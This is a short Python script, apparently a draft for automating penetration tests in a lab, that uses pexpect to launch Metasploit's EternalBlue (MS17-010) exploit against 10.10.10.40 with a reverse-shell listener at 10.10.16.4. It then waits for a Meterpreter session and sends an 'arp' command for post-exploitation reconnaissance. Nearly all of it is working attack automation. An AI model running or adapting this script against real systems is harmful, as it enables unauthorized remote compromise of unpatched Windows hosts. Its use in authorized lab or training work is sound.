import pexpect
import threading

import pexpect.expect


def print_output(child):
    try:
        while True:
            line = child.readline()
            if not line:  # No more output
                break
            print(line)  # Print output as it comes
    except pexpect.exceptions.EOF:
        print("End of File reached by pexpect.")
    except pexpect.exceptions.TIMEOUT:
        print("Timeout reached by pexpect.")
    except Exception as e:
        print("An error occurred:", e)


# This is a good concept but we would need to implement cases where tools outputs need to be parsed.
# For example smbclient would need to follow the flow of 

# Replace these with your actual values

# Spawn a bash session
child = pexpect.spawnu('msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.10.16.4; run"')
# Read the output with a seperate thread
output_thread = threading.Thread(target=print_output, args=(child,))
output_thread.start()
# Send the smbclient command
# child.sendline(f'echo "{password}" | smbclient {smb_server} -U {username} -c "ls"')

# Wait for the command to finish
# child.expect(['.*\\[\\*\\] Exploit completed, but no session was created\\.', '.*Meterpreter session .* opened .*', '.*\\[\\*\\] Started reverse TCP handler on .*', '.*Exploit failed: .*', '.*is not a valid option for this module\\.', '.*\\[\\*\\] 10\\.10\\.10\\.40:445 - Host is likely VULNERABLE to MS17-010!.*', '.*\\[!\\] 10\\.10\\.10\\.40:445 - Unable to find accessible named pipe!.*', '.*\\[-\\] 10\\.10\\.10\\.40:445 - \\S+ - Exploit failed: .*', '.*\\[\\+\\] 10\\.10\\.10\\.40 \\(RHOST: \\S+\\) \\- The target is vulnerable\\.', '.*msf[5|6] >\\s*$', '.*msf[5|6] \\([^)]+\\) >\\s*$', pexpect.TIMEOUT, pexpect.EOF], timeout=60)  # adjust the timeout as needed
child.expect(["msf6 >", "meterpreter >", pexpect.EOF, pexpect.TIMEOUT])

# Print the output
print("Child.before:", child.before)
print("Child.after:", child.after)
# child.interact()

child.sendline("arp")
child.expect(["msf6 ", "meterpreter >", pexpect.EOF, pexpect.TIMEOUT])


print("Child.before:", child.before)
print("Child.after:", child.after)
# print("Child", child)